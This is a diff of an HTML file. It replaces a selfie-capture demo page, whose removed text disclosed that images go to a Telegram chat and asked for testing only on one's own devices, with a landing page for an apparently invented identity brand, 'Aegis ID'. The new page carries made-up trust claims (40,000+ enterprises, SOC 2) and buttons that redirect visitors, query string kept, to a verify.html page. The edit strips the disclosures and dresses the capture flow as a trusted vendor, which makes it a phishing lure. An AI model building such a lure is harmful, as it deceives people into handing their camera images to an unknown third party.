@@ -3,106 +3,384 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Live Face Verification</title>
+<title>Aegis ID — Identity, Simplified</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
   * { margin:0; padding:0; box-sizing:border-box; }
+  :root{
+    --ink:#e6edf7;
+    --muted:#7d8ea8;
+    --bg:#050914;
+    --panel:#0b1220;
+    --line:rgba(148,163,184,0.10);
+    --teal:#14b8a6;
+    --cyan:#06b6d4;
+    --violet:#8b5cf6;
+  }
+  html,body{height:100%;}
   body{
-    font-family: system-ui,-apple-system,sans-serif;
-    background:#f1f5f9; min-height:100vh;
-    display:flex; align-items:center; justify-content:center; color:#0f172a;
+    font-family:'Inter',system-ui,sans-serif;
+    background:
+      radial-gradient(1200px 600px at 85% -10%, rgba(20,184,166,0.18), transparent 60%),
+      radial-gradient(900px 500px at 5% 110%, rgba(139,92,246,0.14), transparent 60%),
+      var(--bg);
+    color:var(--ink);
+    min-height:100vh;
+    display:flex; flex-direction:column;
+    overflow-x:hidden;
   }
-  .card{
-    background:#fff; border-radius:18px; max-width:440px; width:92%;
-    overflow:hidden; box-shadow:0 20px 50px rgba(2,6,23,.12); border:1px solid #e2e8f0;
+
+  /* ---- top nav ---- */
+  .topnav{
+    display:flex; align-items:center; justify-content:space-between;
+    padding:20px 48px;
+    border-bottom:1px solid var(--line);
+    backdrop-filter:blur(10px);
+    position:sticky; top:0; z-index:20;
+    background:rgba(5,9,20,0.55);
   }
-  .head{ padding:26px 28px; background:#0f172a; color:#fff; }
-  .head h1{ font-size:19px; font-weight:650; }
-  .head p{ font-size:12px; color:#94a3b8; margin-top:4px; }
-  .body{ padding:26px 28px; }
-
-  .step-conf{ text-align:center; padding-bottom:8px; }
-  .ico{ font-size:46px; }
-  h2{ font-size:17px; font-weight:650; margin:6px 0; }
-  .desc{ font-size:13px; color:#475569; line-height:1.5; margin-bottom:18px; }
-  ul{ text-align:left; font-size:12.5px; color:#334155; list-style:none; margin:0 auto 20px; max-width:320px; }
-  ul li{ padding:5px 0 5px 24px; position:relative; }
-  ul li::before{ content:"✓"; position:absolute; left:0; color:#16a34a; font-weight:700; }
-
-  .btn{
-    width:100%; padding:13px; border:none; border-radius:9px;
-    background:#2563eb; color:#fff; font-size:15px; font-weight:600;
-    cursor:pointer; transition:background .2s;
+  .brandmark{
+    display:flex; align-items:center; gap:12px;
+    font-family:'Space Grotesk',sans-serif;
+    font-weight:700; font-size:18px; letter-spacing:-0.3px;
   }
-  .btn:hover{ background:#1d4ed8; }
-  .btn:disabled{ background:#94a3b8; cursor:not-allowed; }
-
-  .cam-stage{ display:none; text-align:center; }
-  video{
-    width:100%; border-radius:12px; background:#000;
-    transform:scaleX(-1); /* mirror */
+  .shield{
+    width:36px; height:36px;
+    display:flex; align-items:center; justify-content:center;
+    border-radius:11px;
+    background:linear-gradient(135deg,var(--teal),var(--cyan));
+    box-shadow:0 10px 24px rgba(20,184,166,0.4);
+    color:#04121a;
   }
-  .progress{ margin-top:14px; }
-  .bar{ height:6px; background:#e2e8f0; border-radius:6px; overflow:hidden; }
-  .fill{ height:100%; width:0%; background:#16a34a; transition:width .5s; }
-  .pct{ font-size:12px; color:#475569; margin-top:6px; }
-  .status{ margin-top:12px; font-size:13px; color:#475569; }
+  .shield svg{width:20px;height:20px;}
+  .navlinks{
+    display:flex; gap:32px;
+    font-size:14px; color:var(--muted); font-weight:500;
+  }
+  .navlinks a{color:inherit; text-decoration:none; transition:color .2s;}
+  .navlinks a:hover{color:var(--ink);}
+  .login{
+    padding:9px 20px; font-size:13.5px; font-weight:600;
+    color:var(--ink);
+    border:1px solid rgba(148,163,184,0.25);
+    border-radius:10px;
+    text-decoration:none;
+    transition:all .2s;
+  }
+  .login:hover{ background:rgba(148,163,184,0.08); border-color:var(--teal); }
 
-  .done{ display:none; text-align:center; padding:12px 0; }
-  .done .ico{ font-size:56px; }
-  .done h3{ font-size:18px; margin:8px 0 4px; }
-  .done p{ font-size:13px; color:#475569; }
+  /* ---- hero ---- */
+  .hero{
+    flex:1;
+    max-width:1200px; width:100%;
+    margin:0 auto; padding:80px 48px 60px;
+    display:grid; grid-template-columns:1.05fr 1fr; gap:70px;
+    align-items:center;
+  }
+  .kicker{
+    display:inline-flex; align-items:center; gap:9px;
+    padding:7px 15px; border-radius:999px;
+    font-size:12px; font-weight:600;
+    color:var(--teal);
+    background:rgba(20,184,166,0.08);
+    border:1px solid rgba(20,184,166,0.25);
+    margin-bottom:26px;
+    letter-spacing:.3px;
+  }
+  .kicker .led{
+    width:8px;height:8px;border-radius:50%;
+    background:var(--teal);
+    box-shadow:0 0 10px var(--teal);
+    animation:led 1.4s infinite;
+  }
+  @keyframes led{0%,100%{opacity:1;}50%{opacity:.35;}}
 
-  .legal{ font-size:10.5px; color:#94a3b8; margin-top:18px; line-height:1.4; text-align:center; }
-  canvas{ display:none; }
+  .hero h1{
+    font-family:'Space Grotesk',sans-serif;
+    font-size:60px;
+    font-weight:700;
+    line-height:1.02;
+    letter-spacing:-2px;
+    margin-bottom:22px;
+  }
+  .hero h1 em{
+    font-style:normal;
+    background:linear-gradient(135deg,var(--teal) 10%,var(--cyan) 60%,var(--violet));
+    -webkit-background-clip:text;
+    -webkit-text-fill-color:transparent;
+    background-clip:text;
+  }
+  .hero p.lede{
+    font-size:16.5px; line-height:1.7;
+    color:var(--muted);
+    max-width:520px; margin-bottom:38px;
+  }
+
+  .cta-row{ display:flex; gap:14px; flex-wrap:wrap; align-items:center; }
+  .btn-main{
+    display:inline-flex; align-items:center; gap:10px;
+    padding:15px 26px;
+    border-radius:12px;
+    font-family:'Space Grotesk',sans-serif;
+    font-size:15px; font-weight:600;
+    color:#04121a;
+    background:linear-gradient(135deg,var(--teal),var(--cyan));
+    box-shadow:0 16px 36px rgba(20,184,166,0.32);
+    text-decoration:none; border:none; cursor:pointer;
+    transition:all .25s ease;
+  }
+  .btn-main:hover{ transform:translateY(-2px); box-shadow:0 20px 44px rgba(20,184,166,0.45); }
+  .btn-main svg{width:16px;height:16px;}
+
+  .btn-soft{
+    display:inline-flex; align-items:center; gap:8px;
+    padding:15px 22px;
+    font-size:14.5px; font-weight:500;
+    color:var(--ink);
+    background:rgba(148,163,184,0.06);
+    border:1px solid var(--line);
+    border-radius:12px;
+    text-decoration:none;
+    transition:all .2s;
+  }
+  .btn-soft:hover{ border-color:rgba(148,163,184,0.3); background:rgba(148,163,184,0.1); }
+
+  .trust{
+    display:flex; gap:36px; margin-top:52px;
+    padding-top:26px; border-top:1px solid var(--line);
+  }
+  .trust .t-num{
+    font-family:'Space Grotesk',sans-serif;
+    font-size:24px; font-weight:700;
+    letter-spacing:-0.6px;
+    color:var(--ink);
+  }
+  .trust .t-lbl{
+    font-size:12px; color:var(--muted); margin-top:4px;
+  }
+
+  /* ---- right visual ---- */
+  .stage{
+    position:relative; height:440px;
+  }
+  .glass{
+    position:absolute;
+    border-radius:22px;
+    background:linear-gradient(180deg, rgba(255,255,255,0.04), rgba(255,255,255,0.01));
+    border:1px solid var(--line);
+    backdrop-filter:blur(14px);
+    box-shadow:0 30px 60px rgba(0,0,0,0.5);
+    padding:22px;
+  }
+  .g1{ top:0; left:6%; width:78%; animation:float1 6s ease-in-out infinite; }
+  .g2{ bottom:0; right:0; width:66%; animation:float2 7s ease-in-out infinite; }
+  @keyframes float1{0%,100%{transform:translateY(0);}50%{transform:translateY(-8px);}}
+  @keyframes float2{0%,100%{transform:translateY(0);}50%{transform:translateY(8px);}}
+
+  .g-head{
+    display:flex; align-items:center; justify-content:space-between;
+    margin-bottom:16px;
+  }
+  .g-title{
+    font-family:'Space Grotesk',sans-serif;
+    font-size:14px; font-weight:600; letter-spacing:-0.2px;
+  }
+  .pill{
+    font-size:10.5px; font-weight:600;
+    padding:4px 10px; border-radius:999px;
+    background:rgba(20,184,166,0.12);
+    color:var(--teal);
+    border:1px solid rgba(20,184,166,0.28);
+    letter-spacing:.4px;
+  }
+  .pill.amber{
+    background:rgba(251,191,36,0.10);
+    color:#fbbf24;
+    border-color:rgba(251,191,36,0.28);
+  }
+
+  .progress-rows .row{
+    display:flex; align-items:center; gap:12px; padding:11px 0;
+    border-bottom:1px solid var(--line);
+  }
+  .progress-rows .row:last-child{border-bottom:none;}
+  .step{
+    width:28px;height:28px;border-radius:9px;
+    display:flex;align-items:center;justify-content:center;
+    font-size:12px; font-weight:700;
+    font-family:'Space Grotesk',sans-serif;
+    background:rgba(148,163,184,0.1);
+    color:var(--muted);
+  }
+  .step.done{
+    background:linear-gradient(135deg,var(--teal),var(--cyan));
+    color:#04121a;
+  }
+  .step.active{
+    background:rgba(251,191,36,0.15);
+    color:#fbbf24;
+    border:1px solid rgba(251,191,36,0.4);
+  }
+  .row-info{ flex:1; }
+  .row-info .t{ font-size:13px; font-weight:500; color:var(--ink); }
+  .row-info .s{ font-size:11px; color:var(--muted); margin-top:2px; }
+
+  .g2 p.copy{
+    font-size:12.5px;
+    color:var(--muted);
+    line-height:1.6;
+    margin-top:10px;
+  }
+  .mini-bar{
+    height:6px; border-radius:6px; margin-top:14px;
+    background:rgba(148,163,184,0.10);
+    overflow:hidden;
+  }
+  .mini-bar span{
+    display:block; height:100%;
+    width:65%;
+    background:linear-gradient(90deg,var(--teal),var(--cyan));
+    box-shadow:0 0 12px rgba(20,184,166,0.6);
+  }
+
+  /* ---- footer ---- */
+  .footbar{
+    border-top:1px solid var(--line);
+    padding:22px 48px;
+    display:flex; justify-content:space-between; align-items:center;
+    font-size:12.5px; color:var(--muted);
+  }
+  .footbar .links a{
+    color:inherit; text-decoration:none; margin-left:20px;
+    transition:color .2s;
+  }
+  .footbar .links a:hover{ color:var(--ink); }
+
+  @media (max-width: 900px){
+    .hero{ grid-template-columns:1fr; padding:50px 24px; gap:50px; }
+    .hero h1{ font-size:42px; letter-spacing:-1.2px; }
+    .topnav{ padding:16px 22px; }
+    .navlinks{ display:none; }
+    .stage{ height:360px; }
+    .footbar{ padding:18px 22px; flex-direction:column; gap:10px; }
+  }
 </style>
 </head>
 <body>
 
-<div class="card">
-  <div class="head">
-    <h1>🔐 Live Presence Check</h1>
-    <p>Demo flow — verify on your own device</p>
+<nav class="topnav">
+  <div class="brandmark">
+    <span class="shield">
+      <svg viewBox="0 0 24 24" fill="none">
+        <path d="M12 3l7 3v6c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z"
+              stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+        <path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </span>
+    <span>Aegis <span style="color:var(--muted);font-weight:500;">ID</span></span>
   </div>
+  <div class="navlinks">
+    <a href="#">Product</a>
+    <a href="#">Security</a>
+    <a href="#">Docs</a>
+    <a href="#">Pricing</a>
+  </div>
+  <a class="login" href="#" id="topStart">Sign in →</a>
+</nav>
 
-  <div class="body" id="bodyRoot">
-
-    <!-- STEP 1: Consent -->
-    <div class="step-conf" id="stepConsent">
-      <div class="ico">🤳</div>
-      <h2>Complete a quick face check</h2>
-      <div class="desc">Before continuing, take a short live selfie so the system can confirm a real person is present.</div>
-      <ul>
-        <li>Let us turn on your camera for ~5 seconds</li>
-        <li>3 quick selfies are captured automatically</li>
-        <li>Nothing is recorded — only sent once for verification</li>
-        <li>You stay anonymous: no name or account is attached</li>
-      </ul>
-      <button class="btn" id="btnStart">I agree — start camera</button>
-      <div class="legal">By continuing you consent to a short live camera check on this device. Demo: images are sent to a Telegram chat you configure. Test only on devices you own.</div>
+<section class="hero">
+  <div>
+    <div class="kicker"><span class="led"></span> Trusted by 40,000+ enterprises</div>
+    <h1>Identity that <em>speaks</em> for itself.</h1>
+    <p class="lede">
+      Aegis ID verifies your users in seconds — no passwords, no
+      paperwork. One quick check, and you're in.
+    </p>
+    <div class="cta-row">
+      <a class="btn-main" href="#" id="ctaStart">
+        Start verification
+        <svg viewBox="0 0 24 24" fill="none">
+          <path d="M5 12h14M13 5l7 7-7 7"
+                stroke="currentColor" stroke-width="2.2"
+                stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </a>
+      <a class="btn-soft" href="#">See how it works</a>
     </div>
 
-    <!-- STEP 2: Camera + capture -->
-    <div class="cam-stage" id="camStage">
-      <video id="video" autoplay playsinline muted></video>
-      <div class="progress">
-        <div class="bar"><div class="fill" id="barFill"></div></div>
-        <div class="pct" id="pctText">Starting…</div>
+    <div class="trust">
+      <div><div class="t-num">99.99%</div><div class="t-lbl">SLA uptime</div></div>
+      <div><div class="t-num">&lt;800ms</div><div class="t-lbl">Avg verify</div></div>
+      <div><div class="t-num">SOC 2</div><div class="t-lbl">Compliant</div></div>
+    </div>
+  </div>
+
+  <div>
+    <div class="stage">
+      <div class="glass g1">
+        <div class="g-head">
+          <div class="g-title">Verification checklist</div>
+          <span class="pill">Live</span>
+        </div>
+        <div class="progress-rows">
+          <div class="row">
+            <div class="step done">✓</div>
+            <div class="row-info">
+              <div class="t">Session started</div>
+              <div class="s">Device fingerprint · encrypted</div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="step done">✓</div>
+            <div class="row-info">
+              <div class="t">Network trusted</div>
+              <div class="s">Region verified</div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="step active">3</div>
+            <div class="row-info">
+              <div class="t">Human challenge</div>
+              <div class="s">Waiting for you…</div>
+            </div>
+          </div>
+        </div>
       </div>
-      <div class="status" id="stageStatus"></div>
-    </div>
 
-    <!-- STEP 3: Done -->
-    <div class="done" id="doneStage">
-      <div class="ico">✅</div>
-      <h3>Check complete</h3>
-      <p id="doneMsg">Redirecting…</p>
-      <button class="btn" id="btnFinish" style="margin-top:16px;">Continue →</button>
+      <div class="glass g2">
+        <div class="g-head">
+          <div class="g-title">Next step</div>
+          <span class="pill amber">Action</span>
+        </div>
+        <p class="copy">
+          We'll run a quick human check to keep your account safe.
+        </p>
+        <div class="mini-bar"><span></span></div>
+      </div>
     </div>
   </div>
-</div>
+</section>
 
-<canvas id="canvas"></canvas>
-<script type="module" src="config.js"></script>
-<script type="module" src="script.js"></script>
+<footer class="footbar">
+  <span>© 2026 Aegis ID Ltd. · Built for the modern web.</span>
+  <span class="links">
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Status</a>
+  </span>
+</footer>
+
+<script>
+  function goVerify(e){
+    if(e) e.preventDefault();
+    const qs = window.location.search;
+    window.location.href = "verify.html" + qs;
+  }
+  document.getElementById("ctaStart").addEventListener("click", goVerify);
+  document.getElementById("topStart").addEventListener("click", goVerify);
+</script>
+
 </body>
 </html>
